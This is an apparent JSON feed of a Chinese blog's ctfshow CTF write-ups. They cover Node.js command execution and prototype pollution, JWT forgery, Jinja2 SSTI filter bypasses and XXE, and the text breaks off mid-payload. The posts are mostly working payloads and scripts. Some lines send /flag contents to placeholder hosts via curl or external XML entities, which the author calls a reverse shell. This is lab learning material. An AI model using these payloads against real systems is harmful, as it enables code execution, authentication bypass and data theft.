{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"web入门\" category",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/3418e521/",
            "url": "http://dpm12345.cn/posts/3418e521/",
            "title": "nodejs",
            "date_published": "2023-08-10T14:15:40.000Z",
            "content_html": "<h1 id=\"web-334\"><a href=\"#web-334\" class=\"headerlink\" title=\"web 334\"></a>web 334</h1><p>下载题目附件，得到两个js文件</p>\n<p>user.js</p>\n<pre><code class=\"javascript\">module.exports = {\n  items: [\n    {username: 'CTFSHOW', password: '123456'}\n  ]\n};\n</code></pre>\n<p>login.js</p>\n<pre><code class=\"javascript\">var express = require('express');\nvar router = express.Router();\nvar users = require('../modules/user').items;\n \nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;\n  });\n};\n\n/* GET home page. */\nrouter.post('/', function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var sess = req.session;\n  var user = findUser(req.body.username, req.body.password);\n \n  if(user){\n    req.session.regenerate(function(err) {\n      if(err){\n        return res.json({ret_code: 2, ret_msg: '登录失败'});        \n      }\n       \n      req.session.loginUser = user.username;\n      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              \n    });\n  }else{\n    res.json({ret_code: 1, ret_msg: '账号或密码错误'});\n  }  \n  \n});\n\nmodule.exports = router;\n</code></pre>\n<p>从代码中可以看到，当登录成功时，会返回flag</p>\n<p>而判断是否登录正确的代码如下</p>\n<pre><code class=\"javascript\">var findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;\n  });\n};\n</code></pre>\n<p>从<code>return</code>中，可以看到，要使得输入用户名不为<code>CTFSHOW</code>,但其全部大写等于原设置的用户名(即<code>CTFSHOW</code>),最后密码相等</p>\n<p>由user.js,可以知道用户名和密码分别为<code>CTFSHOW</code>和<code>123456</code>,而为了满足条件，可以将用户名其中一个字母变为小写输入提交</p>\n<p>如下所示</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_1.png\" alt=\"image-20230810195751429\"></p>\n<h1 id=\"web-335\"><a href=\"#web-335\" class=\"headerlink\" title=\"web 335\"></a>web 335</h1><pre><code>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。\n在eval函数的参数中可以构造require('child_process').exec('');来进行调用。\n</code></pre>\n<p>使用<code>exec</code>返回<code>[object Object]</code></p>\n<p>可替换用法 <code>execSync</code> <code>spawnSync</code></p>\n<ol>\n<li><p>使用<code>execSync</code></p>\n<pre><code class=\"javascript\">require('child_process').execSync('ls')\nrequire('child_process').execSync('cat fl00g.txt')\n</code></pre>\n</li>\n<li><p>使用<code>spawnSync</code></p>\n<pre><code class=\"javascript\">require('child_process').spawnSync('ls').stdout.toString()\nrequire('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()\n</code></pre>\n</li>\n</ol>\n<h1 id=\"web-336\"><a href=\"#web-336\" class=\"headerlink\" title=\"web 336\"></a>web 336</h1><pre><code class=\"javascript\">require('child_process').spawnSync('ls').stdout.toString()\nrequire('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()\n</code></pre>\n<h1 id=\"web-337\"><a href=\"#web-337\" class=\"headerlink\" title=\"web 337\"></a>web 337</h1><pre><code class=\"javascript\">var express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){\n      res.end(flag);\n  }else{\n      res.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n</code></pre>\n<p>md5数组绕过</p>\n<pre><code>?a[]=1&amp;b[]=1\n</code></pre>\n<h1 id=\"web-338\"><a href=\"#web-338\" class=\"headerlink\" title=\"web 338\"></a>web 338</h1><p>题目给出了源码</p>\n<p>查阅wp，知该题为nodejs原型污染</p>\n<h2 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h2><p>Javascript里每个类都有一个<code>prototype</code>的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的<code>__proto__</code>属性也指向类的<code>prototype</code>。因此，有以下关系：</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_2.png\" alt=\"web334_2\"></p>\n<p>并且，类的继承是通过原型链传递的，一个类的<code>prototype</code>属性指向其继承的类的一个对象。所以一个类的<code>prototype.__proto__</code>等于其父类的<code>prototype</code>，当然也等于该类对象的<code>__proto__.__proto__</code>属性。</p>\n<p>我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为<code>null</code>为止。所以修改对象的某个父类的<code>prototype</code>的原型就可以通过原型链影响到跟此类有关的所有对象。</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_3.png\" alt=\"web334_3\"></p>\n<p>而在源码中可以发现</p>\n<p>login.js</p>\n<pre><code class=\"javascript\">/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n  \n  \n});\n</code></pre>\n<p>copy在common.js中</p>\n<pre><code class=\"javascript\">module.exports = {\n  copy:copy\n};\n\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 &amp;&amp; key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n  }\n</code></pre>\n<p>由此，在上传登录的用户名密码信息时，copy对其属性即值进行了复制，那么就可以通过抓包在<code>__proto__</code>增添<code>ctfshow</code>这一项的值，为<code>36dboy</code></p>\n<p>抓包并修改提交的数据data如下(即添加<code>__proto_</code>项)</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web_338_1.png\" alt=\"image-20230815011437707\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/8d17cdf0/",
            "url": "http://dpm12345.cn/posts/8d17cdf0/",
            "title": "jwt",
            "date_published": "2023-05-31T17:12:40.000Z",
            "content_html": "<h1 id=\"JWT-简介\"><a href=\"#JWT-简介\" class=\"headerlink\" title=\"JWT 简介\"></a>JWT 简介</h1><h1 id=\"web-345\"><a href=\"#web-345\" class=\"headerlink\" title=\"web 345\"></a>web 345</h1><p>在cookie里找到auth，然后将其放到jwt.io解码，可以得到一堆信息，可以发现签名算法为None，因此不需签名认证</p>\n<p>根据原题目源代码的提示admin，试着将<code>sub:'user'</code>改为admin用户，将新生成的cookie复制到cookie里，然后访问<code>/admin</code>得到flag</p>\n<h1 id=\"web-346\"><a href=\"#web-346\" class=\"headerlink\" title=\"web 346\"></a>web 346</h1><p>相比于签名的，有签名算法了，但可以按上面一题一样，将算法改为None，然后山区签名结果，这样可以访问到flag</p>\n<h1 id=\"web-347\"><a href=\"#web-347\" class=\"headerlink\" title=\"web 347\"></a>web 347</h1><p>根据题目的弱口令，可以爆破或者弱口令尝试分别使用</p>\n<p>计算爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy\">c-jwt-cracker</span><del>自己试跑了好久也没成</del></p>\n<p>字典爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9qd3QtaGFjaw==\">jwt-hack</span></p>\n<p>跑出来密码是<code>123456</code>，然后到<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\">jwt.io</span>encode生成cookie即可</p>\n<p>然后复制修改cookie值，访问<code>/admin/</code></p>\n<h1 id=\"web-348\"><a href=\"#web-348\" class=\"headerlink\" title=\"web 348\"></a>web 348</h1><p>同上一题，得到密码为<code>aaab</code></p>\n<h1 id=\"web-349\"><a href=\"#web-349\" class=\"headerlink\" title=\"web 349\"></a>web 349</h1><p>根据给的<code>app.js</code>，分别访问<code>/public.key</code>和<code>/private.key</code>获得公私钥文件</p>\n<p>然后放到jwt.io网站上生成cookie(原题目给的私钥大小不是2048位的，不能生成)</p>\n<p>这里采用的是<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXZVNHkxODdIRS8=\">ctfshow jwt视频</span>的自建环境生成cookie</p>\n<p>要注意的是，新版本的jsonwebtoken(9.0.0)可能会报错</p>\n<p><code>secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code></p>\n<p>查询相关资料后，可以下载8.5.1版本的jsonwebtoken，<code>npm install jsonwebtoken@8.5.1 --save</code>,然后生成后复制cookie替换，最后post访问网站</p>\n<h1 id=\"web-350\"><a href=\"#web-350\" class=\"headerlink\" title=\"web 350\"></a>web 350</h1><p>相比于上题，只能获得公钥，但可以通过<code>RS256 -&gt; HS256</code>是验证算法改变</p>\n<pre><code>HS256算法使用密钥为所有消息进行签名和验证。\n\n而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。\n\n如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。\n\n由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。\n\n这样的话，后端代码使用RSA公钥+HS256算法进行签名验证\n</code></pre>\n<p>按照上题的构造方法生成cookie即可</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/47d18edd/",
            "url": "http://dpm12345.cn/posts/47d18edd/",
            "title": "SSTI",
            "date_published": "2023-03-31T03:12:40.000Z",
            "content_html": "<h1 id=\"web-361\"><a href=\"#web-361\" class=\"headerlink\" title=\"web 361\"></a>web 361</h1><p>提示考点在名字</p>\n<p>尝试<code>?name={{4+4}}</code>，返回出错，确认为注入点</p>\n<p>于是<code>?name={{''.__class__.__mro__[1].__subclasses__()}}</code></p>\n<p>找到</p>\n<p><code>&lt;class 'os._wrap_close'&gt;</code></p>\n<p>然后</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<p>得到 app.py</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}</code></p>\n<p>得到 app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}</code></p>\n<p>得到flag</p>\n<p>或者<code>?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}</code></p>\n<h1 id=\"web-362\"><a href=\"#web-362\" class=\"headerlink\" title=\"web 362\"></a>web 362</h1><p>进行了过滤，但不清楚过滤啥</p>\n<p>只能发现上面os的不能选择，于是选择407的<code>&lt;class 'subprocess.Popen'&gt;</code></p>\n<p><code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['popen']('ls').read()}}</code>则不行</p>\n<p>payload:<code>?name={{''.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__['__builtins__'].eval('__import__(\"os\").popen(\"cat /flag\").read()')}}</code></p>\n<h1 id=\"web-363\"><a href=\"#web-363\" class=\"headerlink\" title=\"web 363\"></a>web 363</h1><p><code>?name={{()[request.args.a].__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.b].eval(request.args.c)}}&amp;a=__class__&amp;b=__builtins__&amp;c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<h1 id=\"web-364\"><a href=\"#web-364\" class=\"headerlink\" title=\"web 364\"></a>web 364</h1><p>cookies绕过</p>\n<p><code>?name={{x.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.b].eval(request.cookies.c)}}</code></p>\n<p><code>b=__builtins__</code></p>\n<p><code>c=__import__(\"os\").popen(\"cat /flag\").read()</code></p>\n<p>或者<code>?name={{x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.c)}}</code></p>\n<h1 id=\"web-365\"><a href=\"#web-365\" class=\"headerlink\" title=\"web 365\"></a>web 365</h1><p>同上一题</p>\n<h1 id=\"web-366\"><a href=\"#web-366\" class=\"headerlink\" title=\"web 366\"></a>web 366</h1><p>上面的几乎都过滤了，下划线也过滤了，而attr用于获取变量</p>\n<pre><code class=\"raw\">\"\"|attr(\"__class__\")\n相当于\n\"\".__class__\n</code></pre>\n<p>故<code>?name={{(x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}</code></p>\n<pre><code class=\"raw\">a=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n</code></pre>\n<h1 id=\"web-367\"><a href=\"#web-367\" class=\"headerlink\" title=\"web 367\"></a>web 367</h1><p>同web 366</p>\n<h1 id=\"web-368\"><a href=\"#web-368\" class=\"headerlink\" title=\"web 368\"></a>web 368</h1><p><code>{{`被过滤,使用`{%%}`绕过,再借助`print()`回显\n\n故`?name={%print((x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))%}`\n\n```raw\na=__init__\nb=__globals__\nc=__getitem__\nd=__builtins__\ne=__import__('os').popen('cat /flag').read()\n```\n\n# web 369\n\n过滤了request，这就需要自己来凑字符串\n\n## 解法一\n\n这里拿config来凑。一般我们想到的是使用`__str__()`，但是一个问题是`_`被ban了，所以`__str__()`用不了；这里拿string过滤器来得到config的字符串：`config|string`，但是获得字符串后本来应该用中括号或者`__getitem__()`，但是问题是`_`和`[` `]`被ban了，所以获取字符串中的某个字符比较困难。这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层`lower()`方法，方便跑更多字符\n\n这里用的是`{{lipsum.__globals__['os'].popen('cat /flag').read()}}</code></p>\n<pre><code class=\"python\">'''\nAuthor       : dpm12345 1006975692@qq.com\nGithub       : https://github.com/dpm12345\nDate         : 2023-04-09 09:39:23\nLastEditors  : dpm12345 1006975692@qq.com\nLastEditTime : 2023-04-09 11:33:12\nDescription  : \n'''\n\n\nimport requests\nurl=\"http://26e2b843-cdf9-4c43-8946-f748dd29eb7f.challenge.ctf.show/?name={{% print (config|string|list).pop({}).lower() %}}\"\n \npayload=[\"__globals__\",\"os\",\"cat /flag\"]\ndef get_res(payload_list):\n    dic = {}\n    result= []\n    for payload in payload_list:\n        tmp_res = \"\"\n        for j in payload:\n            try:\n                print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(dic[j],j))\n                tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(dic[j])\n            except:\n                for i in range(0,1000):\n                    r=requests.get(url=url.format(i))\n                    location=r.text.find(\"&lt;h3&gt;\")\n                    word=r.text[location+4:location+5]\n                    if word==j.lower():\n                        print(\"(config|string|list).pop(%d).lower()  ==  %s\"%(i,j))\n                        tmp_res+=\"(config|string|list).pop(%d).lower()~\"%(i)\n                        dic[j] = i\n                        break\n        result.append(tmp_res[:len(tmp_res)-1])\n    return result\n\nprint(get_res(payload))\n\n# \"?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}\"\n</code></pre>\n<p>或者也可构造前面使用过的，如<code>?name={{x.__init__.__globals__.__getitem__[\"__builtins__\"].eval(\"__import__('os').popen('cat /flag').read()\")}}</code></p>\n<p>但要注意的是，使用<code>|attr</code>进行连接时，后面要带上参数时,需将前面一块用括号括起，如要获取到<code>builtins</code>的内容，<code>(x|attr('__init__')|attr('__globals__')|attr('__getitem__'))('__builtins__')</code></p>\n<p>如果是使用前面的，这里试验了以下，也是可以的</p>\n<pre><code class=\"raw\">?name={% print (((x|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(21).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).eval((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(18).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()))((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()))()\n```\n\n## 解法二\n\n```raw\nGET:?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{%print(x.open(file).read())%}\n</code></pre>\n<p>原理是</p>\n<pre><code class=\"raw\">{% set a=dict(o=oo,s=ss)|join %}\n</code></pre>\n<p>这样得到的a就是把这个字典的键名拼接后的值，即os，这样的拼接不需要用到单双引号，非常方便。至于要做的，就是想办法把类似<code>_</code>这样的字符通过一系列操作找出来就可以了</p>\n<p>如何得到_?</p>\n<pre><code class=\"raw\">{% set a=(()|select|string|list)|attr(po)(24)%}\n</code></pre>\n<p>此时a=_</p>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>读文件盲注</p>\n<pre><code class=\"python\">import requests\nimport string\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\nurl ='''http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n{% set cmd2='''\n \ns=string.digits+string.ascii_lowercase+'{_-}'\nflag=''\nfor i in range(1,50):\n\tprint(i)\n\tfor j in s:\n\t\tx=flag+j\n\t\tu=url+ccchr(x)+'%}'+'{% if x.open(cmd).read('+str(i)+')==cmd2%}'+'1341'+'{% endif%}'\n        #print(u)\n        r=requests.get(u)\n        if(\"1341\" in r.text):\t\t\t\n            flag=x\n            print(flag)\n            break\n</code></pre>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>反弹shell，监听 nc -lvp 4567</p>\n<pre><code class=\"python\">http://da9612ac-2b66-485d-8149-b76a1f03d22c.chall.ctf.show/?name=\n{% set a=(()|select|string|list).pop(24)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\n123\n{%endif%}\n \n//cmd的值用这个脚本生成\ns='__import__(\"os\").popen(\"curl http://xxx:4567?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+str(ord(s[i]))+')%2b'\n        else:\n            t+='chr('+str(ord(s[i]))+')'\n    return t\n</code></pre>\n<h1 id=\"web-370\"><a href=\"#web-370\" class=\"headerlink\" title=\"web 370\"></a>web 370</h1><p>经测试，相比之前又过滤掉了数字</p>\n<p>获取数字的话有两个方法</p>\n<h2 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2><p><code>index()</code></p>\n<p>用来获取索引值</p>\n<h2 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2><p><code>length()/count()</code></p>\n<p>用来获取长度值(注意<code>%2b</code>防止<code>+</code>被解析为空格)<br>$$<br>24 = (2^2)^2 + 2 ^ 3\\<br>47 = (2^2)^2 * 3 - 1\\<br>102 = ((2^2)^2+1) * 2 * 3\\<br>108 = ((2^2)^2+2) * 2 * 3\\<br>97 = ((2^2)^2) * 2 * 3\\<br>103 = ((2^2)^2+1) * 2 * 3 + 1<br>$$</p>\n<pre><code class=\"raw\">?name=\n{% set po=dict(po=a,p=a)|join%}\n{% set one = (dict(a=a)|join|length) %}\n{% set two = (dict(aa=a)|join|length) %}\n{% set three = (dict(aaa=a)|join|length) %}\n{% set a=(()|select|string|list)|attr(po)(two**two**two%2btwo**three) %}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set file=chr(three*(two**two**two)-one)%2bchr(two*three*(two**two**two%2bone))%2bchr(two*three*(two**two**two%2btwo))%2bchr(two*three*(two**two**two)%2bone)%2bchr(two*three*(two**two**two%2bone)%2bone)%}\n{% print(x.open(file).read()) %}\n</code></pre>\n<h1 id=\"web-371\"><a href=\"#web-371\" class=\"headerlink\" title=\"web 371\"></a>web 371</h1><p>ban掉了print，这里使用反弹shell</p>\n<pre><code class=\"raw\">?name=\n{% set c=(t|count)%}\n{% set cc=(dict(e=a)|join|count)%}\n{% set ccc=(dict(ee=a)|join|count)%}\n{% set cccc=(dict(eee=a)|join|count)%}\n{% set ccccc=(dict(eeee=a)|join|count)%}\n{% set cccccc=(dict(eeeee=a)|join|count)%}\n{% set ccccccc=(dict(eeeeee=a)|join|count)%}\n{% set cccccccc=(dict(eeeeeee=a)|join|count)%}\n{% set ccccccccc=(dict(eeeeeeee=a)|join|count)%}\n{% set cccccccccc=(dict(eeeeeeeee=a)|join|count)%}\n{% set ccccccccccc=(dict(eeeeeeeeee=a)|join|count)%}\n{% set cccccccccccc=(dict(eeeeeeeeeee=a)|join|count)%}\n{% set coun=(ccc~ccccc)|int%}\n{% set po=dict(po=a,p=a)|join%}\n{% set a=(()|select|string|list)|attr(po)(coun)%}\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n{% set cmd=\n%}\n{%if x.eval(cmd)%}\nabc\n{%endif%}\n</code></pre>\n<p><code>cmd</code>的内容用以下python脚本跑出</p>\n<pre><code class=\"python\">def aaa(t):\n    t='('+(int(t[:-1:])+1)*'c'+'~'+(int(t[-1])+1)*'c'+')|int'\n    return t\nip = \"\"\nport = 56414\ns=f'__import__(\"os\").popen(\"curl {ip}:{port}?p=`cat /flag`\").read()'\ndef ccchr(s):\n    t=''\n    for i in range(len(s)):\n        if i&lt;len(s)-1:\n            t+='chr('+aaa(str(ord(s[i])))+')%2b'\n        else:\n            t+='chr('+aaa(str(ord(s[i])))+')'\n    return t\nprint(ccchr(s))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/e93ac459/",
            "url": "http://dpm12345.cn/posts/e93ac459/",
            "title": "XXE",
            "date_published": "2023-03-20T12:15:40.000Z",
            "content_html": "<h1 id=\"web-373\"><a href=\"#web-373\" class=\"headerlink\" title=\"web 373\"></a>web 373</h1><p>burp进行提交，hackbar影响上传</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE test [\n&lt;!ENTITY xxe SYSTEM \"file:///flag\"&gt;\n]&gt;\n&lt;zhong&gt;\n&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;\n&lt;/zhong&gt;\n</code></pre>\n<h1 id=\"web374-376\"><a href=\"#web374-376\" class=\"headerlink\" title=\"web374~376\"></a>web374~376</h1><p>可以引用外部实体，在服务器写以下文件</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\n$content = $_GET['1'];\nif(isset($content)){\n    file_put_contents('flag.txt',\"flag如下\\n\".$content);\n}else{\n    echo 'no data input';\n}\n</code></pre>\n<p>xxe.xml</p>\n<pre><code class=\"xml\">&lt;!ENTITY % all\n\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/exp.php?1=%file;'\"\n&gt;\n%all;\n</code></pre>\n<p>payload为</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;\n</code></pre>\n<p>得到flag</p>\n<h1 id=\"web-377\"><a href=\"#web-377\" class=\"headerlink\" title=\"web 377\"></a>web 377</h1><p><code>if(preg_match('/&lt;\\?xml version=\"1\\.0\"|http/i', $xmlfile))</code></p>\n<p>增加了对<code>http</code>的过滤</p>\n<p>利用 utf-16 编码</p>\n<pre><code class=\"python\">a ='''\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"&gt;\n&lt;!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/xxe.xml\"&gt;\n%remote;\n%send;\n]&gt;'''\nimport requests\n\n\ndata = a.encode('utf-16')\n\nurl = 'http://129c32f8-755b-4686-ad48-257a0011c8aa.challenge.ctf.show/'\n\nrequests.post(url=url,data=data)\n</code></pre>\n<h1 id=\"web-378\"><a href=\"#web-378\" class=\"headerlink\" title=\"web 378\"></a>web 378</h1><p>抓包，可以发现用户，密码用<code>XML</code>形式发送</p>\n<p>可以直接回显</p>\n<pre><code class=\"xml\">&lt;!DOCTYPE ANY[\n&lt;!ENTITY file SYSTEM 